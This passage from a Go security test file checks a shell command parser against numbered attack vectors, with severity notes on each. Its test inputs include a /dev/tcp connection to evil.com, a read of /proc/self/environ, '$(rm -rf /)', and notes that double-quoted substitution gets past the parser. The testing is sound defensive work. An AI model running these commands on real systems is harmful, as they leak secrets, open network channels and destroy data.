	for _, input := range dangerousCommands {
		t.Run(input, func(t *testing.T) {
			p, err := Parse(input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if p.Segments[0].Command == "" {
				t.Fatalf("empty command")
			}
		})
	}
}

// ATTACK VECTOR 28: Unicode Non-Breaking Spaces
//
// Severity: LOW
// Status: Parser treats non-breaking spaces as literal characters (not separators)
//
// Unicode non-breaking space (U+00A0) and other Unicode space characters are NOT
// treated as word separators by the bash parser. "ls\u00A0/tmp" is one word,
// not two. This is correct behavior. The command name would be "ls\u00A0/tmp"
// which won't match "ls" in the validator — safe.

func TestSecurityNBSPNotWordSeparator(t *testing.T) {
	p := mustParse(t, "ls\u00A0/tmp")
	// NBSP is part of the command word, not a separator
	if got := p.Segments[0].Command; !strings.Contains(got, "\u00A0") {
		t.Fatalf("Command = %q, expected NBSP to be embedded", got)
	}
}

// ATTACK VECTOR 29: Empty/Whitespace-Only Commands
//
// Severity: N/A (properly handled)
// Status: DEFENDED

func TestSecurityEmptyAndWhitespaceRejected(t *testing.T) {
	mustParseErr(t, "", "Empty command")
	mustParseErr(t, "   ", "Empty command")
	mustParseErr(t, "\t", "Empty command")
	mustParseErr(t, "\n", "Empty command")
	mustParseErr(t, "''", "Empty command")
	mustParseErr(t, `""`, "Empty command")
}

// ATTACK VECTOR 30: $"..." Locale Quoting with Expansions
//
// Severity: LOW
// Status: Parser allows through
//
// $"..." is locale-translation quoting. Inside $"...", variable expansion and
// command substitution still work in bash. The parser treats $"..." as a single
// node and doesn't check for expansions inside it.

func TestSecurityLocaleQuotingWithExpansion(t *testing.T) {
	p, err := Parse(`echo $"hello"`)
	if err != nil {
		t.Skipf("Parser now rejects this: %v", err)
	}
	if got := p.Segments[0].Args[0]; got != `$"hello"` {
		t.Fatalf("arg = %q, want %q", got, `$"hello"`)
	}
}

// ATTACK VECTOR 31: Process/Command Substitution in Various Positions
//
// Severity: N/A for bare forms (properly handled)
// Status: DEFENDED for bare forms, BYPASSED when double-quoted (see Vector 1)

func TestSecuritySubstitutionsRejectedBare(t *testing.T) {
	mustParseErr(t, "echo $(whoami)", "Command substitution")
	mustParseErr(t, "echo `whoami`", "Command substitution")
	mustParseErr(t, "diff <(ls /tmp) <(ls /var)", "Process substitution")
	mustParseErr(t, "$(rm -rf /)", "Command substitution")
	mustParseErr(t, "`rm -rf /`", "Command substitution")
}

// ATTACK VECTOR 32: Heredocs and Herestrings
//
// Severity: N/A (properly handled as redirections)
// Status: DEFENDED

func TestSecurityHeredocsRejected(t *testing.T) {
	mustParseErr(t, "cat << EOF\nhello\nEOF", "Redirections")
	mustParseErr(t, "cat <<- EOF\n\thello\n\tEOF", "Redirections")
	mustParseErr(t, "cat <<< 'hello'", "Redirections")
}

// ATTACK VECTOR 33: "declare -f" Without Assignment
//
// Severity: N/A (properly handled)
// Status: DEFENDED — mvdan.cc/sh parses declare/export/local/readonly/typeset
// as DeclClause regardless of whether there's an assignment, and the parser
// rejects all DeclClause nodes.

func TestSecurityDeclBuiltinsAllFormsRejected(t *testing.T) {
	for _, input := range []string{
		"declare -x FOO=bar",
		"declare -f myfunc",
		"declare -a arr",
		"export",
		"export FOO=bar",
		"local foo",
		"readonly foo",
		"typeset -i NUM=42",
	} {
		mustParseErr(t, input, "")
	}
}

// ATTACK VECTOR 34: Quote Stripping Produces Correct Results for Simple Cases
//
// Severity: N/A (verification of correct behavior)
// Status: Working correctly

func TestSecurityQuoteStrippingCorrect(t *testing.T) {
	// Single-quoted: 'hello' → hello
	p := mustParse(t, `echo 'hello'`)
	if got := p.Segments[0].Args[0]; got != "hello" {
		t.Fatalf("single-quoted arg = %q, want %q", got, "hello")
	}

	// Double-quoted (no expansion): "hello" → hello
	p2 := mustParse(t, `echo "hello"`)
	if got := p2.Segments[0].Args[0]; got != "hello" {
		t.Fatalf("double-quoted arg = %q, want %q", got, "hello")
	}

	// Bare word: hello → hello
	p3 := mustParse(t, `echo hello`)
	if got := p3.Segments[0].Args[0]; got != "hello" {
		t.Fatalf("bare arg = %q, want %q", got, "hello")
	}

	// Quoted with spaces: "hello world" → hello world
	p4 := mustParse(t, `echo "hello world"`)
	if got := p4.Segments[0].Args[0]; got != "hello world" {
		t.Fatalf("spaced arg = %q, want %q", got, "hello world")
	}

	// Single-quoted with special chars: 'it"s' → it"s
	p5 := mustParse(t, `echo 'it"s'`)
	if got := p5.Segments[0].Args[0]; got != `it"s` {
		t.Fatalf("special arg = %q, want %q", got, `it"s`)
	}

	// Double-quoted with single quote: "it's" → it's
	p6 := mustParse(t, `echo "it's"`)
	if got := p6.Segments[0].Args[0]; got != "it's" {
		t.Fatalf("apostrophe arg = %q, want %q", got, "it's")
	}
}

// ATTACK VECTOR 35: Escaped Quote in Double Quotes
//
// Severity: INFORMATIONAL
// Status: Parser produces backslash-escaped quote in output
//
// echo "\"" — the printer outputs \". Our quote stripping checks word[0]=='"'
// and word[len-1]=='"'. The printed word is \" which starts with \ not " —
// so no stripping occurs. This is correct.

func TestSecurityEscapedQuoteInDoubleQuotes(t *testing.T) {
	p := mustParse(t, `echo "\""`)
	// Printer outputs: \" (escaped quote)
	// word[0] = '\' — not a quote char — no stripping
	if got := p.Segments[0].Args[0]; got != `\"` {
		t.Fatalf("arg = %q, want %q", got, `\"`)
	}
}

// ATTACK VECTOR 36: Smart/Curly Quotes (Unicode)
//
// Severity: INFORMATIONAL (not shell quotes — treated as literal chars)
// Status: Correct behavior
//
// Unicode smart quotes (U+2018 ' U+2019 ' U+201C " U+201D ") are not shell
// quoting characters. They are treated as literal characters in the word.

func TestSecuritySmartQuotesAreLiteral(t *testing.T) {
	p := mustParse(t, "echo \u2018hello\u2019")
	arg := p.Segments[0].Args[0]
	// Smart quotes are multi-byte UTF-8 — not ASCII single quotes
	// word[0] would be 0xe2 (first byte of U+2018), not 0x27 (')
	// So no quote stripping occurs — correct
	if !strings.Contains(arg, "\u2018") || !strings.Contains(arg, "\u2019") {
		t.Fatalf("arg = %q, expected smart quotes preserved", arg)
	}
}

// ATTACK VECTOR 37: Four Single Quotes (Echo '''')
//
// Severity: INFORMATIONAL
// Status: Correct behavior
//
// echo '''' — bash parses as: echo + empty-string + empty-string → echo
// with one arg that is '' (two adjacent empty single-quoted strings concatenated).
// The printer outputs ''. Our quote stripping sees word[0]='\'' and word[-1]='\'',
// strips to empty string. The empty string is filtered by the word != "" check.

func TestSecurityFourSingleQuotesEmpty(t *testing.T) {
	// '''' = two adjacent empty single-quoted strings = ""
	// After printing: '' → strip quotes → "" → filtered as empty
	p := mustParse(t, "echo ''''")
	// The parser may either filter the empty arg entirely or retain it.
	// Either outcome is safe — verify no unexpected content sneaks through.
	for _, arg := range p.Segments[0].Args {
		if arg != "" && arg != "''" {
			t.Errorf("unexpected arg %q from echo '''' — expected empty string, omitted, or literal ''", arg)
		}
	}
}

// ATTACK VECTOR 38: /dev/tcp and /dev/udp Paths
//
// Severity: MEDIUM (deferred to validator)
// Status: Parser allows through — validator/command allowlist must handle
//
// /dev/tcp/HOST/PORT and /dev/udp/HOST/PORT are bash built-in network
// paths. They only work with bash redirections (which are rejected), but
// they could appear as arguments to other commands.

func TestSecurityDevTcpUdpPassParser(t *testing.T) {
	p := mustParse(t, "cat /dev/tcp/evil.com/80")
	if got := p.Segments[0].Args[0]; got != "/dev/tcp/evil.com/80" {
		t.Fatalf("arg = %q, want %q", got, "/dev/tcp/evil.com/80")
	}

	p2 := mustParse(t, "cat /dev/udp/evil.com/53")
	if got := p2.Segments[0].Args[0]; got != "/dev/udp/evil.com/53" {
		t.Fatalf("arg = %q, want %q", got, "/dev/udp/evil.com/53")
	}
}

// ATTACK VECTOR 39: /proc/self Paths
//
// Severity: MEDIUM (deferred to validator)
// Status: Parser allows through — validator/command allowlist must handle

func TestSecurityProcSelfPassParser(t *testing.T) {
	p := mustParse(t, "cat /proc/self/environ")
	if got := p.Segments[0].Args[0]; got != "/proc/self/environ" {
		t.Fatalf("arg = %q, want %q", got, "/proc/self/environ")
	}
}

// ATTACK VECTOR 40: Single-Quoted Command Name
//
// Severity: INFORMATIONAL (correct and safe)
// Status: Working correctly
//
// 'ls' as a command name — the quotes are stripped, resulting in cmd="ls".
// This matches the allowlist correctly. This is intended behavior.

func TestSecuritySingleQuotedCommandCorrect(t *testing.T) {
	p := mustParse(t, `'ls' /tmp`)
	if got := p.Segments[0].Command; got != "ls" {
		t.Fatalf("Command = %q, want %q", got, "ls")
	}

	p2 := mustParse(t, `"ls" /tmp`)
	if got := p2.Segments[0].Command; got != "ls" {
		t.Fatalf("Command = %q, want %q", got, "ls")
	}
}
